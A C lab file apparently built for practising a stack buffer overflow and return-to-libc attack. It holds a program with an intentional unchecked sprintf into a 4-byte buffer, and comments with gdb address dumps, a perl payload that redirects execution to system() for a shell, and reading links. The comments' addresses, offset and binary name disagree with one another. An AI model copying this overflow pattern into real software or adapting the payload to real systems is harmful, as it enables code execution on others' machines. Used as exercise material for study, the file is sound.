#include <stdio.h>
#include <stdlib.h>

void myfunc(char *strs[])
{
  char buf[4];
  printf("target: last argument is at %p\n", &strs);
  sprintf(buf, "%s", strs[1]);
  printf("we copied '%s' into the buffer\n", buf);
}

int main(int argc, char *argv[])
{
  if(argc < 2) {
    printf("usage: %s data\n", argv[0]); return 0;
  }
  printf("target: SHELL is at %p, system is at %p\n", getenv("SHELL"), &system);
  myfunc(argv);
  printf("And we returned safely from our function\n");
  return 0;
}

// gcc -O0 -fno-stack-protector -o bof bof.c

/*
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7eb4990 <system> \x90\x49\xeb\xb7
(gdb) p execl
$2 = {<text variable, no debug info>} 0xb7f12360 <execl>
(gdb) p exit
$3 = {<text variable, no debug info>} 0xb7ea9fb0 <exit>

EIP overwrite-4 = 1028

Run with:
PS1='\$ ' SHELL=/bin/sh ./stack_based_overflow `perl -e 'print "A"x8
. "\xe5\xd5\xff\xff" . "\xee\xff\xc0\x10" . "\xb0\x83\x04\x08";'`

system is at 0x80483b0
SHELL is at 0xffffd637

Articles to read:
http://www.packetstormsecurity.org/papers/bypass/return-to-libc-linux.txt
http://neworder.box.sk/newsread.php?newsid=11535
http://phrack.org/issues.html?issue=58&id=4#article
*/
